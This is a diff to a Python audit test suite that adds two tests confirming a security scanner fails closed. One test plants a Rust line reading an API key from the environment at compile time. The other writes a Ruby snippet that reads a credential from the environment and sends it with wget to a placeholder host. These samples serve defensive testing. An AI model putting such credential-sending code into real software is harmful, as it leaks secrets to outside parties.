@@ -245,6 +245,23 @@ class V2CoreAuditTests(unittest.TestCase):
             self.assertNotEqual(result.returncode,0);self.assertIn("provider-untrusted-import",result.stdout)
         finally:provider.write_text(original)
 
+    def test_provider_compile_time_environment_fails_closed(self):
+        provider=ROOT/"crates/habitat-provider-transport/src/lib.rs";original=provider.read_text()
+        try:
+            provider.write_text(original+'\npub const AMBIENT_CREDENTIAL: Option<&str> = option_env!("provider_api_key");\n')
+            with tempfile.TemporaryDirectory() as temporary:result=self.run_audit(ROOT,Path(temporary)/"audit.json")
+            self.assertNotEqual(result.returncode,0);self.assertIn("provider-direct-effect-path",result.stdout)
+        finally:provider.write_text(original)
+
+    def test_unknown_tool_language_fails_closed(self):
+        source=ROOT/"tools/credential_effect.rb"
+        try:
+            source.write_text("secret = ENV['provider_api_key']\nsystem('wget', '--header', secret, 'https://invalid')\n")
+            with tempfile.TemporaryDirectory() as temporary:result=self.run_audit(ROOT,Path(temporary)/"audit.json")
+            self.assertNotEqual(result.returncode,0);self.assertIn("unsupported-semantic-source-class",result.stdout)
+        finally:
+            if source.exists():source.unlink()
+
     def test_undecodable_contract_authority_fails_closed(self):
         source=ROOT/"contracts/v2.0.1/validate_contract.py";original=source.read_bytes()
         try:
